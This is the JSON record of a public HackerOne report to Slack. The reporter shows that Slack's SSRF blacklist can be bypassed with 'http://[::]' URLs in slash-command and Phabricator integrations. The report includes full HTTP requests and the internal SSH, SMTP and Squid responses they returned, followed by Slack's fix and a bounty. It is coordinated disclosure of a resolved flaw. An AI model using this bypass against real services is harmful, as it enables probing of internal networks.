{"id":61312,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MTMxMg==","url":"https://hackerone.com/reports/61312","title":"Bypass of the SSRF protection (Slack commands, Phabricator integration)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-05-11T21:42:32.614Z","submitted_at":"2015-05-11T21:42:32.614Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"agarri_fr","url":"/agarri_fr","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":69,"url":"https://hackerone.com/slack","handle":"slack","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Slack","twitter_handle":"slackhq","website":"https://slack.com","about":"All your team communication in one place, instantly searchable, and available wherever you go."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-14T20:38:17.068Z","bug_reporter_agreed_on_going_public_at":"2016-08-15T20:38:06.913Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Abstract\r\n\r\nSome Slack features like \"Integrations / Phabricator\" and \"Integration / Slash Commands\" allow users to submit URL that will be accessed by the backend servers. A blacklist tries to forbid access to internal resources (loopback, 10.0.0.0/8, 192.168.0.0/24, ...). This blacklist can be bypassed using \"[::]\" as the hostname. Only services binding all the interfaces and supporting IPv6 can be reached using that vector.\r\n\r\n# Integration features\r\n\r\n## Slack commands\r\n\r\nModify the \"url\" property of the \"/ssrf\" Slack command (with \"http://[::]:25/\" as the destination)\r\n\r\n    POST /services/4814366410 HTTP/1.1\r\n    Host: agarri.slack.com\r\n    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\r\n    Accept-Encoding: gzip, deflate\r\n    Referer: https://agarri.slack.com/services/4814366410?updated=1\r\n    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691\r\n    Connection: keep-alive\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Content-Length: 148\r\n    \r\n    crumb=s-1431286469-c73f073ed6-%E2%98%83\u0026edit_service=1\u0026is_edit=1\u0026command=/ssrf\u0026url=http://[::]:25/\u0026method=GET\u0026in_autocomplete=on\u0026desc=\u0026usage=\u0026label=\r\n\r\nExecute the Slack command \"/ssrf\"\r\n\r\n    POST /api/chat.command?t=1431286754 HTTP/1.1\r\n    Host: agarri.slack.com\r\n    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\r\n    Accept-Encoding: gzip, deflate\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Referer: https://agarri.slack.com/messages/general/\r\n    Content-Length: 133\r\n    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691\r\n    Connection: keep-alive\r\n    Pragma: no-cache\r\n    Cache-Control: no-cache\r\n    \r\n    agent=webapp\u0026command=/ssrf\u0026text=\u0026channel=C04QDFHLT\u0026token=xoxs-4829527689-4829527691-4814341714-d0346ec616\u0026set_active=true\u0026_attempts=1\r\n\r\nAccess port TCP/25 on loopback\r\n\r\n    HTTP/1.1 200 OK\r\n    Access-Control-Allow-Origin: *\r\n    Cache-Control: private, no-cache, no-store, must-revalidate\r\n    Content-Type: application/json; charset=utf-8\r\n    Date: Mon, 11 May 2015 20:28:06 GMT\r\n    Expires: Mon, 26 Jul 1997 05:00:00 GMT\r\n    Pragma: no-cache\r\n    Server: Apache\r\n    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\r\n    Vary: Accept-Encoding\r\n    X-Accepted-OAuth-Scopes: post\r\n    X-Content-Type-Options: nosniff\r\n    X-OAuth-Scopes: identify,read,post,client,admin\r\n    X-XSS-Protection: 0\r\n    Content-Length: 120\r\n    Connection: keep-alive\r\n    \r\n    {\"ok\":true,\"response\":\"220 squid3.tinyspeck.com ESMTP Postfix\\r\\n221 2.7.0 Error: I can break rules, too. Goodbye.\\r\\n\"}\r\n\r\n## Phabricator\r\n\r\nThis vector is very similar to the previous one. If the port is opened, a HTTP 302 code is received. If not, an error 500 is generated. Outside of that, this vector is blind.\r\n\r\nRequest for http://[::]:22/\r\n\r\n    POST /services/4836378801 HTTP/1.1\r\n    Host: agarri.slack.com\r\n    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\r\n    Accept-Encoding: gzip, deflate\r\n    Referer: https://agarri.slack.com/services/4836378801?updated=1\r\n    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691\r\n    Connection: keep-alive\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Content-Length: 132\r\n    \r\n    edit_service=1\u0026edit_label=1\u0026phabricator_url=http://[::]:22/\u0026conduit_user=Yolo\u0026conduit_cert=foobar\u0026import_phriction=1\u0026import_pastes=1\r\n\r\n302 Found\r\n\r\n    HTTP/1.1 302 Found\r\n    Content-Type: text/html\r\n    Date: Mon, 11 May 2015 20:16:02 GMT\r\n    Location: /services/4836378801?updated=1\r\n    Server: Apache\r\n    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\r\n    Vary: Accept-Encoding\r\n    X-Frame-Options: SAMEORIGIN\r\n    Content-Length: 0\r\n    Connection: keep-alive\r\n\r\nRequest for http://[::]:11/\r\n\r\n    POST /services/4836378801 HTTP/1.1\r\n    Host: agarri.slack.com\r\n    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\r\n    Accept-Encoding: gzip, deflate\r\n    Referer: https://agarri.slack.com/services/4836378801?updated=1\r\n    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691\r\n    Connection: keep-alive\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Content-Length: 132\r\n    \r\n    edit_service=1\u0026edit_label=1\u0026phabricator_url=http://[::]:21/\u0026conduit_user=Yolo\u0026conduit_cert=foobar\u0026import_phriction=1\u0026import_pastes=1\r\n\r\n500 Error\r\n\r\n    HTTP/1.1 500 Server Error\r\n    Cache-Control: private, no-cache, no-store, must-revalidate\r\n    Content-Type: text/html; charset=utf-8\r\n    Date: Mon, 11 May 2015 20:22:11 GMT\r\n    Expires: Mon, 26 Jul 1997 05:00:00 GMT\r\n    Pragma: no-cache\r\n    Server: Apache\r\n    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\r\n    Vary: Accept-Encoding\r\n    X-Frame-Options: SAMEORIGIN\r\n    X-XSS-Protection: 0\r\n    Content-Length: 32657\r\n    Connection: keep-alive\r\n    \r\n    \u003csnip\u003e\r\n\r\n# Identified services\r\n\r\nSSH on TCP/22\r\n\r\n    SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4\r\n    Protocol mismatch.\r\n\r\nSMTP on TCP/25\r\n\r\n    220 squid3.tinyspeck.com ESMTP Postfix\r\n    221 2.7.0 Error: I can break rules, too. Goodbye.\r\n\r\nSquid on TCP/3128\r\n\r\n\r\n    [...]\r\n    \u003ch1\u003eERROR\u003c/h1\u003e\r\n    \u003ch2\u003eThe requested URL could not be retrieved\u003c/h2\u003e\r\n    [...]\r\n    \u003cp\u003eThe following error was encountered while trying to retrieve the URL: \u003ca href=\"/?token=wW0Mjd9kSTPzazuTzHPkLNpI\u0026team_id=T04QDFHL9\u0026team_domain=agarri\u0026channel_id=C04QDFHLT\u0026channel_name=general\u0026user_id=U04QDFHLB\u0026user_name=nico\u0026command=/ssrf\u0026text=\"\u003e/?token=wW0Mjd9kSTPzazuTzHPkLNpI\u0026team_id=T04QDFHL9\u0026team_domain=agarri\u0026channel_id=C04QDFHLT\u0026channel_name=general\u0026user_id=U04QDFHLB\u0026user_name=nico\u0026command=/ssrf\u0026text=\u003c/a\u003e\u003c/p\u003e\r\n    \u003cblockquote id=\"error\"\u003e\r\n    \u003cp\u003e\u003cb\u003eInvalid URL\u003c/b\u003e\u003c/p\u003e\r\n    \u003c/blockquote\u003e\r\n    [...]\r\n    Generated Mon, 11 May 2015 20:34:46 GMT by localhost (squid\\/3.1.19)\r\n    [...]\r\n\r\n\r\n\r\n","bounty_amount":"100.0","formatted_bounty":"$100","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-14T20:38:07.065Z","allow_singular_disclosure_after":-160079692.89331517,"singular_disclosure_allowed":true,"vote_count":11,"voters":["johndoe1492","leonishan","dilawer01","bugdiscloseguys","khizer47","kiraak-boy","sumit7","cryptographer","dyabla","helcaraxe","and 1 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":410304,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. This is pretty cool. We'll investigate this and get back to you once we have further information to share.","automated_response":false,"created_at":"2015-05-12T20:06:00.209Z","updated_at":"2015-05-12T20:06:00.209Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":488053,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ping?","automated_response":false,"created_at":"2015-06-22T19:48:26.525Z","updated_at":"2015-06-22T19:48:26.525Z","actor":{"username":"agarri_fr","cleared":true,"url":"/agarri_fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":505657,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We've been able to reproduce this issue, and we're working on disabling IPv6 support. Thanks for your patience while we roll this out.","automated_response":false,"created_at":"2015-07-11T00:05:28.127Z","updated_at":"2015-07-11T00:05:28.127Z","actor":{"username":"leighhoneywell","cleared":false,"url":"/leighhoneywell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/411/956aec0fd38fb8e9577a2f87a2d5e33ee4eb8a9e_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":560035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ping?","automated_response":false,"created_at":"2015-08-24T08:40:06.578Z","updated_at":"2015-08-24T08:40:06.578Z","actor":{"username":"agarri_fr","cleared":true,"url":"/agarri_fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":605808,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey agarri_fr,\nWe've deployed a fix for this issue.  Can you try to reproduce the finding on your end?\nCheers,\nSlack","automated_response":false,"created_at":"2015-10-01T21:53:17.868Z","updated_at":"2015-10-01T21:53:17.868Z","actor":{"username":"slacka","cleared":false,"url":"/slacka","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":626428,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It seems that the issue isn't patched at all.\n\nURL \"http://[::]:22/\" (SSH):\n\n    /ssrf_lo_22\n    SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.7\n    Protocol mismatch.\n\nURL \"http://[::]:25/\" (SMTP):\n\n    /ssrf_lo_25\n    220 squid26.tinyspeck.com ESMTP Postfix\n    221 2.7.0 Error: I can break rules, too. Goodbye.\n\nNote: IPv6 should be disabled on the outgoing _proxy_, not on the backend server","automated_response":false,"created_at":"2015-10-20T17:58:13.873Z","updated_at":"2015-10-20T17:58:13.873Z","actor":{"username":"agarri_fr","cleared":true,"url":"/agarri_fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":643507,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey agarri_fr,\n\nI created a new issue for the ipv6 blocking and escalated the case with our engineers.  I'll let you know when we have an update.\n\nCheers,\nSalck","automated_response":false,"created_at":"2015-11-03T21:46:22.933Z","updated_at":"2015-11-03T21:46:22.933Z","actor":{"username":"slacka","cleared":false,"url":"/slacka","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":654298,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey agarri_fr,\n\nWe rolled a more robust fix here this time.  Can you test from your end to see if you can still reproduce this finding?\n\nCheers,\nSlack","automated_response":false,"created_at":"2015-11-11T18:33:46.670Z","updated_at":"2015-11-11T18:33:46.670Z","actor":{"username":"slacka","cleared":false,"url":"/slacka","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":655197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The fix seems OK: I can't reach ports 22 and 25 anymore.","automated_response":false,"created_at":"2015-11-12T12:21:14.395Z","updated_at":"2015-11-12T12:21:14.395Z","actor":{"username":"agarri_fr","cleared":true,"url":"/agarri_fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":655789,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hey agarri_fr,\n\nWe've resolved this issue, and are going to issue you a bounty!  Thanks for your report, and happy bug hunting in the future!  \n\nCheers,\nSlack","automated_response":false,"created_at":"2015-11-12T20:08:58.484Z","updated_at":"2015-11-12T20:08:58.484Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Slack"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"slack","collaborator":{"username":"agarri_fr","url":"/agarri_fr"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":655790,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2015-11-12T20:09:09.740Z","updated_at":"2015-11-12T20:09:09.740Z","actor":{"username":"slacka","cleared":false,"url":"/slacka","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"agarri_fr","url":"/agarri_fr"},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1127899,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-08-15T20:38:06.958Z","updated_at":"2016-08-15T20:38:06.958Z","first_to_agree":true,"actor":{"username":"agarri_fr","cleared":true,"url":"/agarri_fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1194466,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-09-14T20:38:17.165Z","updated_at":"2016-09-14T20:38:17.165Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Slack"}},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}